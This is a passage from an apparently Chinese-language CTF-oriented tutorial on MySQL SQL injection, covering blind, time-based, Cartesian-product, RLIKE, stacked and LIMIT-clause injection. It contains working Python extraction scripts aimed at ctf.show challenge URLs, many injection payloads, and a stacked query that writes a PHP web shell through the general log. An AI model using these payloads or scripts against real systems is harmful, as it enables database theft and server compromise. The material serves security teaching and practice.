columns</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#查询表中数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_table_data</span>(<span class="params">url, headers,tables</span>):</span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):<span class="comment">#用来爆破表中的数据</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            data_payload = <span class="string">f&quot;?id=1&#x27; and ascii(substr((select password from <span class="subst">&#123;tables&#125;</span> where username=&#x27;flag&#x27;),<span class="subst">&#123;c+<span class="number">0</span>&#125;</span>,1))=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;--+&quot;</span></span><br><span class="line">            response = requests.get(url + data_payload, headers=headers) </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span><span class="keyword">in</span> response.text:<span class="comment">#判断是否存在注入</span></span><br><span class="line">                data += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;flag为:  &#x27;</span>+ <span class="built_in">str</span>(data))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://598dad09-8ca9-4769-9d38-8f62ee4186c7.challenge.ctf.show/api/v4.php&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    databaselen = brute_force_database_length(url, headers)</span><br><span class="line">    databasename = brute_force_database_name(url, headers, databaselen)</span><br><span class="line">    tablecount = brute_force_table_count(url, headers, databasename)</span><br><span class="line">    tables = brute_force_table_name(url, headers, tablecount, databasename)</span><br><span class="line">    <span class="keyword">for</span> table <span class="keyword">in</span> tables:</span><br><span class="line">        <span class="comment">#column_count = brute_force_column_count(url, headers, table)   </span></span><br><span class="line">        <span class="comment">#columns = brute_force_column_name(url, headers,table, column_count)</span></span><br><span class="line">        data = brute_force_table_data(url, headers,table)</span><br></pre></td></tr></table></figure>

<h4 id="姿势一-case-…-when-…-then-…-else-…-end"><a href="#姿势一-case-…-when-…-then-…-else-…-end" class="headerlink" title="姿势一:case … when … then … else … end"></a>姿势一:case … when … then … else … end</h4><p>随便给个payload</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">case</span>(ascii(substr(database()<span class="built_in">from</span>(<span class="number">1</span>)<span class="built_in">for</span>(<span class="number">1</span>))))<span class="built_in">when</span>(<span class="number">102</span>)<span class="built_in">then</span>(<span class="number">1</span>)<span class="built_in">else</span>(<span class="number">0</span>)end</span><br></pre></td></tr></table></figure>

<ul>
<li>这是一个条件表达式。它根据某个条件的值返回不同的结果。</li>
<li>具体来说，<code>case ascii(substr(database() from 1 for 1))</code> 这部分将检查数据库名称第一个字符的 ASCII 值。</li>
<li>如果这个值是 <code>102</code>（对应字符 ‘f’），则返回 <code>1</code>；否则返回 <code>0</code>。</li>
</ul>
<h2 id="4-时间盲注"><a href="#4-时间盲注" class="headerlink" title="4.时间盲注"></a>4.时间盲注</h2><p>界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</p>
<p>小tips:<strong>在真实的渗透测试过程中，我们有时候不清楚整个表的情况的话，可以用这样的方式进行刺探，比如设置成 sleep(1) 看最后多少秒有结果，推断表的行数就是多少</strong>)</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250119205506435.png" alt="image-20250119205506435"></p>
<p>这里可以看到延时了8s也就是4个2s，可以看到我们的行数也是4，但是不知道为啥没出结果是我没想到的</p>
<p>时间盲注与布尔盲注类似。时间型盲注就是利用时间函数的延迟特性来判断注入语句是否执行成功。</p>
<p>什么情况下考虑使用时间盲注？</p>
<pre><code>1. 无法确定参数的传入类型。整型，加单引号，加双引号返回结果都一样
1. 不会回显注入语句执行结果，故无法使用UNION注入
1. 不会显示报错信息，故无法使用报错注入
1. 符合盲注的特征，但不属于布尔型盲注
</code></pre>
<p>常用函数</p>
<p>sleep(n)：将程序挂起一段时间, n为n秒。</p>
<p>if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句。</p>
<p>使用sleep()函数和if()函数：<code>and (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null)) #</code>   如果返回正确则 页面会停顿10秒，返回错误则会立马返回。只有指定条件的记录存在时才会停止指定的秒数。</p>
<p><strong>手工注入:</strong></p>
<p><strong>1. 利用sleep()函数和if()函数判断数据库长度：</strong>1 and if(length(database())&#x3D;x,sleep(y),1)–页面y秒后才回应，说明数据库名称长度为x</p>
<p>**2. 猜测数据库名称:例如:**1 and if(ascii(substr(database(),1,1))&#x3D;115,sleep(3),1) adcii(s)&#x3D;115</p>
<p>**3. 猜测表中数:**1 and if((select count(table_name) from information_schema.tables where table_schema&#x3D;database())&#x3D;x,sleep(y),1) 页面y秒后反应，说明有x张表</p>
<p>**4. 猜测表:**1 and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;110,sleep(3),1)  ascii(n)&#x3D;110</p>
<p>**5. 猜测字段数:**1 and if((select count(column_name) from information_schema.columns where table_name&#x3D;’flag’)&#x3D;1,sleep(3),1)  3秒后响应，只有一个字段</p>
<p>**6. 猜测字段名:**1 and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’表名’),1,1))&#x3D;102,sleep(3),1) </p>
<h3 id="常规盲注"><a href="#常规盲注" class="headerlink" title="常规盲注"></a>常规盲注</h3><h4 id="sleep函数"><a href="#sleep函数" class="headerlink" title="sleep函数"></a>sleep函数</h4><p>sleep()函数 : <code>sleep()</code> 函数用于使程序暂停或延迟一段时间</p>
<h4 id="benchmark函数"><a href="#benchmark函数" class="headerlink" title="benchmark函数"></a>benchmark函数</h4><p>benchmark()函数 : <code>BENCHMARK(loop_count,expr)</code>函数用来测试 SQL 语句或者函数的执行时间，第一个参数表示执行的次数，第二个参数表示要执行的操作。通常使用使用 MD5、SHA1 等函数，执行次数 100000。</p>
<p>如benchmark(10000000,md5(‘yu22x’));会计算10000000次md5(‘yu22x’)，因为次数很多所以就会产生延时，但这种方法对服务器会对产生很大的负荷，容易把服务器跑崩，如果崩掉的话就把time.sleep的值改大点，除了md5还可以使用其他函数，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">benchmark(1000000,encode(&quot;hello&quot;,&quot;good&quot;));</span><br><span class="line">benchmark(1e7,sha1(&#x27;kradress&#x27;));</span><br></pre></td></tr></table></figure>

<p><strong>手工盲注特别繁琐，碰到这类题目要会用脚本或工具sqlmap</strong></p>
<p>贴个时间盲注的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_table_data</span>(<span class="params">url</span>):</span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):<span class="comment">#用来爆破表中的数据</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            payload = <span class="string">f&quot;?id=1&#x27; and if(ascii(substr((select password from ctfshow_user5 where username=&#x27;flag&#x27;),<span class="subst">&#123;c+<span class="number">0</span>&#125;</span>,1))=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;,sleep(5),0)--+&quot;</span></span><br><span class="line">            time1 = datetime.datetime.now()</span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            time2 = datetime.datetime.now()</span><br><span class="line">            sec = (time2 - time1).seconds</span><br><span class="line">            <span class="keyword">if</span> sec &gt;= <span class="number">5</span>:<span class="comment">#超时时间为5秒</span></span><br><span class="line">                data += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;flag为:  &#x27;</span>+ <span class="built_in">str</span>(data))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://4a879471-5db2-4202-876f-d5c67c22bc4f.challenge.ctf.show/api/v5.php&#x27;</span></span><br><span class="line">    flag = brute_force_table_data(url)</span><br></pre></td></tr></table></figure>

<p>那如果这两个函数都被禁用了的话呢?我们又该如何去进行时间盲注</p>
<h3 id="笛卡尔积盲注"><a href="#笛卡尔积盲注" class="headerlink" title="笛卡尔积盲注"></a>笛卡尔积盲注</h3><h5 id="什么是笛卡尔积"><a href="#什么是笛卡尔积" class="headerlink" title="什么是笛卡尔积"></a>什么是笛卡尔积</h5><p><strong>笛卡尔积</strong>（Cartesian Product）是集合论和关系代数中的一个基本概念，它指的是<strong>两个集合（或表）中所有可能的有序对的组合</strong>。</p>
<p>假设有两个集合 <em>A</em> 和 B：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">A</span>=&#123;a1,a2,…,am&#125;</span><br><span class="line"><span class="attr">B</span>=&#123;b1,b2,…,bn&#125;</span><br></pre></td></tr></table></figure>

<p>那么，<em>A</em> 和 <em>B</em> 的笛卡尔积 A×B定义为：</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">A</span>×B=&#123;(ai,bj)∣ai∈<span class="keyword">A</span>,bj∈B&#125;</span><br></pre></td></tr></table></figure>

<p>即 A<em>×</em>B 包含所有 A 中的元素与 B 中的元素的组合。</p>
<p>在数据库中看，笛卡尔积指的是<strong>两个表中的所有行的组合</strong>。假设有两个表 A 和 B：</p>
<ul>
<li>表 A 有 m行，表 B 有 n 行。</li>
<li>表 A有 p列，表 B有 q列。</li>
</ul>
<p>那么，表 A和表 B的笛卡尔积结果是一个新表，包含：</p>
<ul>
<li><strong>行数</strong>：m×n行。</li>
<li><strong>列数</strong>：p+q列（表 A的所有列 + 表 B的所有列）。</li>
</ul>
<p>其实说白了就是两个表中每一行跟另一个表所有行的不同组合的结果</p>
<p>例如</p>
<ul>
<li><p>表A 有 2 行，列名为id和 name</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id <span class="string">| name</span></span><br><span class="line"><span class="punctuation">-</span><span class="punctuation">-</span><span class="punctuation">-</span><span class="string">|------</span></span><br><span class="line"><span class="number">1</span>  <span class="string">| Alice</span></span><br><span class="line"><span class="number">2</span>  <span class="string">| Bob</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>表B 有 3 行，列名为 city和country</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">city    <span class="string">| country</span></span><br><span class="line"><span class="punctuation">-</span><span class="punctuation">-</span><span class="punctuation">-</span><span class="punctuation">-</span><span class="punctuation">-</span><span class="punctuation">-</span><span class="punctuation">-</span><span class="punctuation">-</span><span class="string">|---------</span></span><br><span class="line">Beijing <span class="string">| China</span></span><br><span class="line">New York<span class="string">| USA</span></span><br><span class="line">Tokyo   <span class="string">| Japan</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>那么此时他们的笛卡尔积结果是什么呢？</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">id |<span class="string"> name  </span>|<span class="string"> city     </span>|<span class="string"> country</span></span><br><span class="line"><span class="string">---</span>|<span class="string">-------</span>|<span class="string">----------</span>|<span class="string">--------</span></span><br><span class="line"><span class="string">1  </span>|<span class="string"> Alice </span>|<span class="string"> Beijing  </span>|<span class="string"> China</span></span><br><span class="line"><span class="string">1  </span>|<span class="string"> Alice </span>|<span class="string"> New York </span>|<span class="string"> USA</span></span><br><span class="line"><span class="string">1  </span>|<span class="string"> Alice </span>|<span class="string"> Tokyo    </span>|<span class="string"> Japan</span></span><br><span class="line"><span class="string">2  </span>|<span class="string"> Bob   </span>|<span class="string"> Beijing  </span>|<span class="string"> China</span></span><br><span class="line"><span class="string">2  </span>|<span class="string"> Bob   </span>|<span class="string"> New York </span>|<span class="string"> USA</span></span><br><span class="line"><span class="string">2  </span>|<span class="string"> Bob   </span>|<span class="string"> Tokyo    </span>|<span class="string"> Japan</span></span><br></pre></td></tr></table></figure>

<p>笛卡尔积为什么能打盲注呢？</p>
<p>因为笛卡尔积的算法是一种乘法，在查询数据很多的表的时候结果会呈现指数倍的增长，导致运算量很大，从而在查询的时候造成延时。<strong>实现的方法就是将表查询不断的叠加，使之以指数倍运算量的速度增长，不断增加系统执行 sql 语句的负荷，直到可以达到我们想要的时间延迟</strong>，但是由于我们真实的ctf题目或者真实环境中的表和字段等信息是不一样的，所以我们通常都会利用mysql系统自带的表去进行笛卡尔积盲注</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C;</span><br></pre></td></tr></table></figure>

<p>根据数据库查询的特点，这句话的意思就是将 A B C 三个表进行笛卡尔积（全排列），并输出最终的行数，我们来实验一下</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250505123112675.png" alt="image-20250505123112675"></p>
<p>因为如果是3个表的话我的负荷太大了跑不出来会崩掉，所以只能写两个表</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250505123133565.png" alt="image-20250505123133565"></p>
<p>可以看到，和我们的分析是一样的，但是从时间来看，这种时间差是运算量指数级增加的结果。我们可以利用这其中的耗时去做到一个时间盲注的效果</p>
<p>那我们常规的payload就是</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="keyword">and</span> <span class="keyword">if</span>(<span class="built_in">length</span>(database())&gt;<span class="number">1</span>,(SELECT count(*) FROM information_schema.<span class="built_in">columns</span> A, information_schema.<span class="built_in">columns</span> B),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>

<p>当if的条件满足时就会执行笛卡尔积的查询结果，就会造成延时，但是具体的延时时间还要具体环境具体分析，对环境的调试也是重要的一点</p>
<h3 id="RLIKE注入"><a href="#RLIKE注入" class="headerlink" title="RLIKE注入"></a>RLIKE注入</h3><p>先讲讲RLIKE函数</p>
<h4 id="RLIKE函数"><a href="#RLIKE函数" class="headerlink" title="RLIKE函数"></a>RLIKE函数</h4><p>在 MySQL 中，<code>RLIKE</code> 是用于<strong>正则表达式匹配</strong>的操作符。它允许你在查询中使用正则表达式来匹配字符串。</p>
<p>基础语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expression RLIKE pattern</span><br></pre></td></tr></table></figure>

<ul>
<li><code>expression</code>：要匹配的字符串列。</li>
<li><code>pattern</code>：正则表达式模式，用于匹配列中的字符串。</li>
</ul>
<p>rlike盲注还需要的函数就是rpad()函数和repeat()函数</p>
<h4 id="rpad-函数"><a href="#rpad-函数" class="headerlink" title="rpad()函数"></a>rpad()函数</h4><p>在 MySQL 中，<code>RPAD</code> 是一个字符串函数，用于<strong>在字符串的右侧填充指定的字符，直到字符串达到指定的长度</strong>。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">RPAD</span><span class="params">(str,len,padstr)</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>str</code>：原始字符串。</li>
<li><code>len</code>：填充后的目标长度。</li>
<li><code>padstr</code>：用于填充的字符（可以是单个字符或多个字符）</li>
</ul>
<p><strong>返回值</strong></p>
<ul>
<li>如果 <code>str</code> 的长度已经大于或等于 <code>len</code>，则 <code>RPAD</code> 会直接返回 <code>str</code> 的前 <code>len</code> 个字符。</li>
<li>如果 <code>str</code> 的长度小于 <code>len</code>，则 <code>RPAD</code> 会在 <code>str</code> 的右侧填充 <code>padstr</code>，直到字符串的长度达到 <code>len</code>。</li>
</ul>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250505145732313.png" alt="image-20250505145732313"></p>
<h4 id="REPEAT-函数"><a href="#REPEAT-函数" class="headerlink" title="REPEAT()函数"></a>REPEAT()函数</h4><p>在 MySQL 中，<code>REPEAT()</code> 是一个字符串函数，用于<strong>将指定的字符串重复指定的次数</strong>。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">REPEAT</span><span class="params">(str,count)</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>str</code>：需要重复的字符串。</li>
<li><code>count</code>：重复的次数（必须是一个非负整数）。</li>
</ul>
<p><strong>2. 返回值</strong></p>
<ul>
<li>返回一个由 <code>str</code> 重复 <code>count</code> 次组成的新字符串。</li>
<li>如果 <code>count</code> 为 <code>0</code>，则返回空字符串 <code>&#39;&#39;</code>。</li>
<li>如果 <code>count</code> 为负数，则返回 <code>NULL</code>。</li>
</ul>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250505145944295.png" alt="image-20250505145944295"></p>
<p>那这里的RLIKE盲注的思路是什么呢？</p>
<p>通过<code>rpad</code>或<code>repeat</code>构造长字符串，加以计算量大的pattern，然后利用正则匹配机制的贪婪匹配去做正则回溯，所以会造成延时</p>
<p>不知道为什么本地测的时候总是会超时报错</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250505150508798.png" alt="image-20250505150508798"></p>
<h3 id="GET-LOCK盲注"><a href="#GET-LOCK盲注" class="headerlink" title="GET_LOCK盲注"></a>GET_LOCK盲注</h3><p>GET_LOCK()函数:<code>GET_LOCK()</code> 是一个用于实现分布式锁的函数。它通过在数据库中创建一个命名锁，以确保同一时刻只有一个会话能够持有该锁。</p>
<p>基础语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET_LOCK(str, timeout)</span><br></pre></td></tr></table></figure>

<p><code>str</code>：指定锁的名称，类型为字符串。锁的名称是区分大小写的。</p>
<p><code>timeout</code>：指定等待获取锁的时间（以秒为单位）。如果设置为 0，则立即返回。如果设置为负数，则表示无限期等待。</p>
<p><strong>返回值</strong>：</p>
<ul>
<li>返回 1：表示成功获取锁。</li>
<li>返回 0：表示在超时时间内未能获取到锁。</li>
<li>返回 NULL：表示获取锁时出错（例如，由于权限问题）。</li>
</ul>
<p>利用条件是，开启两个 MySQL 数据库连接，先后在两个连接中使用 GET_LOCK 函数获取相同名字的锁，后面使用 GET_LOCK 函数的连接无法得到锁，等待 <code>timeout</code>秒后执行其它操作。</p>
<h2 id="5-堆叠注入"><a href="#5-堆叠注入" class="headerlink" title="5.堆叠注入"></a>5.堆叠注入</h2><p>堆叠注入就是 <strong>通过添加一个新的查询或者终止查询( ; )，可以达到 修改数据 和 调用存储过程 的目的</strong></p>
<p>分号<code>;</code>为MYSQL语句的结束符，若在支持多语句执行的情况下，可利用此方法进行sql注入。比如有函数mysqli_multi_query()，它支持执行一个或多个针对数据库的查询，查询语句使用分号隔开。如果正常的语句是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1;</span><br></pre></td></tr></table></figure>

<p>若支持堆叠注入，我们就可以在后面添加自己的语句执行命令，如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1;show tables--+</span><br></pre></td></tr></table></figure>

<p>但通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返回前端页面，可考虑使用<code>RENAME</code>关键字，将想要的数据列名&#x2F;表名更改成返回数据的SQL语句所定义的表&#x2F;列名</p>
<p>还有一种姿势就是利用handler函数</p>
<h3 id="handler函数"><a href="#handler函数" class="headerlink" title="handler函数"></a>handler函数</h3><p>在 MySQL 中，<code>HANDLER</code> 是一个用于操作特定存储引擎（如 MyISAM 和 InnoDB）表的命令，用于直接访问表的数据而不通过 SQL 层。</p>
<p><code>HANDLER</code> 语句主要用于以下操作：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>打开表</span><br><span class="line"><span class="keyword">handler</span> <span class="built_in">table_name</span> <span class="keyword">open</span></span><br><span class="line"><span class="number">2.</span>读取第一行</span><br><span class="line"><span class="keyword">handler</span> <span class="built_in">table_name</span> <span class="keyword">read</span> first或者(next)</span><br><span class="line"><span class="number">3.</span>关闭表</span><br><span class="line"><span class="keyword">handler</span> <span class="built_in">table_name</span> <span class="keyword">close</span></span><br></pre></td></tr></table></figure>

<p>堆叠注入因为能更好更灵活的处理语句，所以我们也不止可以用来进行sql查询，也可以进行一些比较骚的姿势</p>
<h3 id="开启日志记录getshell"><a href="#开启日志记录getshell" class="headerlink" title="开启日志记录getshell"></a>开启日志记录getshell</h3><p>这个其实很简单，就是通过执行sql语句开启日志记录，然后我们执行查询语句的时候就会记录在日志文件中，我们尝试一下</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1&#x27;;set global general_log = <span class="string">&quot;ON&quot;</span>;<span class="built_in">set</span> global <span class="attribute">general_log_file</span>=<span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;--+</span><br></pre></td></tr></table></figure>

<p>这里的话指定日志文件的路径是一个shell.php文件，那我们进行getshell</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">?id=1&#x27;;select </span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>此时日志文件就记录了该代码，由于是php文件所以会解析里面的代码，从而进行getshell</p>
<h2 id="6-limit注入"><a href="#6-limit注入" class="headerlink" title="6.limit注入"></a>6.limit注入</h2><p>其实这个注入我接触的时间很晚，也是因为做到题目才知道存在这个注入方式的，参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://lightless.me/archives/111.html">SQL Injections in MySQL LIMIT clause</a></p>
<p>p牛的文章：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">[转载]Mysql下Limit注入方法</a></p>
<p>其实这个方法比较老了，限制版本也挺老的，仅适用于 <strong>5.0.0&lt; MySQL &lt;5.6.6</strong>的版本中，在limit语句后面的进行的注入</p>
<p>假设我们此时的查询语句是</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> field <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> id &gt; <span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id <span class="keyword">LIMIT</span> injection_point</span><br></pre></td></tr></table></figure>

<p>可以看到上面的语句中包含了order by语句，在 MySQL 中，<code>UNION</code> 语句和 <code>ORDER BY</code> 子句的使用顺序是有严格规定的。具体来说，<code>UNION</code> 语句不能在 <code>ORDER BY</code> 的后面</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250506111505548.png" alt="image-20250506111505548"></p>
<p>至于为什么呢？</p>
<ul>
<li>union用于将多个查询语句的结果集合成一个结果集，它的执行顺序是先执行每个执行语句，生成各自的结果集，然后再将这些结果集合并为一个结果集</li>
<li>order by 用于将结果集进行排列，它只能对最终的结果集进行排列而不是对每个查询语句的结果集单独排列，如果 <code>ORDER BY</code> 出现在某个 <code>SELECT</code> 语句中，它只会对该 <code>SELECT</code> 语句的结果集进行排序，而不是对整个 <code>UNION</code> 的结果集排序。</li>
</ul>
<p>其实这也是限制union联合注入的一种方法</p>
<p>然后我们看看mysq5官方手册中定义的select语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">SELECT </span><br><span class="line">    [ALL | DISTINCT | DISTINCTROW ] </span><br><span class="line">      [HIGH_PRIORITY] </span><br><span class="line">      [STRAIGHT_JOIN] </span><br><span class="line">      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] </span><br><span class="line">      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] </span><br><span class="line">    select_expr [, select_expr ...] </span><br><span class="line">    [FROM table_references </span><br><span class="line">    [WHERE where_condition] </span><br><span class="line">    [GROUP BY &#123;col_name | expr | position&#125; </span><br><span class="line">      [ASC | DESC], ... [WITH ROLLUP]] </span><br><span class="line">    [HAVING where_condition] </span><br><span class="line">    [ORDER BY &#123;col_name | expr | position&#125; </span><br><span class="line">      [ASC | DESC], ...] </span><br><span class="line">    [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;] </span><br><span class="line">    [PROCEDURE procedure_name(argument_list)] </span><br><span class="line">    [INTO OUTFILE &#x27;file_name&#x27; export_options </span><br><span class="line">      | INTO DUMPFILE &#x27;file_name&#x27; </span><br><span class="line">      | INTO var_name [, var_name]] </span><br><span class="line">    [FOR UPDATE | LOCK IN SHARE MODE]]</span><br></pre></td></tr></table></figure>

<p>我们重点看limit语句后面的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;] </span><br><span class="line">    [PROCEDURE procedure_name(argument_list)] </span><br><span class="line">    [INTO OUTFILE &#x27;file_name&#x27; export_options </span><br><span class="line">      | INTO DUMPFILE &#x27;file_name&#x27; </span><br><span class="line">      | INTO var_name [, var_name]] </span><br><span class="line">    [FOR UPDATE | LOCK IN SHARE MODE]]</span><br></pre></td></tr></table></figure>

<ul>
<li><code>LIMIT row_count</code>：返回前 <code>row_count</code> 行。</li>
<li><code>LIMIT offset, row_count</code>：跳过 <code>offset</code> 行，返回接下来的 <code>row_count</code> 行。</li>
<li><code>LIMIT row_count OFFSET offset</code>：与 <code>LIMIT offset, row_count</code> 等效。</li>
</ul>
<p>后面跟着两个可选的子语句PROCEDURE 和 INTO</p>
<p><code>[PROCEDUR procedure_name(argument_list)]</code>：调用存储过程处理查询结果。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[INTO OUTFILE &#x27;file_name&#x27; export_options </span><br><span class="line">  | INTO DUMPFILE &#x27;file_name&#x27; </span><br><span class="line">  | INTO var_name [, var_name]]</span><br></pre></td></tr></table></figure>

